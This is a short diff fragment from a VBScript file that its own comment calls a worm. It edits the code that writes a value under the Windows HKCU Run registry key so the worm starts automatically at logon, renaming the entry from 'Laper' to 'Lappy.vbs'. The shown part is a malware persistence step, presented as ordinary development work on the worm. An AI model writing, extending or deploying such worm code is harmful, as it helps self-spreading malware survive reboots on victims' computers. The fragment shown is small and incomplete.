@@ -65,7 +65,7 @@ Next
 
 ' Create a registry key to autostart the worm
 strRegistryPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
-strRegistryKey = "Laper"
+strRegistryKey = "Lappy.vbs"
 strRegistryValue = chr(34) & strFilePath & chr(34)
 
 Set objRegistry = CreateObject("WScript.Shell")
